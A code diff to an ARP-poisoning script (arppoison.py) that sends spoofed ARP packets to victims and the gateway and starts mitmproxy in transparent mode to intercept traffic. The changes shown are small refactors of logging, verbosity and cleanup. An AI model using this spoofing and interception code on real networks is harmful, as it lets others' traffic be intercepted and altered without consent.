@@ -3,7 +3,6 @@
 # Execute with sudo python arppoison.py
 #
 #
-from scapy.all import *
 import time
 import argparse
 import signal
@@ -11,6 +10,8 @@ import nfqueue
 import threading
 from multiprocessing import Process
 import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+from scapy.all import *
 
 exit = False
 
@@ -52,7 +53,7 @@ def spoof(localMac,victims,gateway):
                 j+=1
                 if exit:
                     break
-                send(arp)
+                send(arp,verbose=False)
             time.sleep(1)
     t1 = threading.Thread(target=run)
     threads.append(t1)
@@ -109,11 +110,10 @@ def main(args):
     if os.geteuid() != 0:
         sys.exit("[!] Please run as root")
 
-    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
-
+    clean()
     if args.clean:
-        return clean()
+        return
     interface = "eth0"
     if args.interface is not None:
         interface = args.interface
@@ -162,7 +162,7 @@ def main(args):
         if need_proxy:
             def run():
                 os.system("mitmproxy -T --host --anticache --stream 10m")
-                print "Dns spoof stopped"
+                print "proxy stopped"
             p = Process(target=run)
             threads.append(p)
         else:
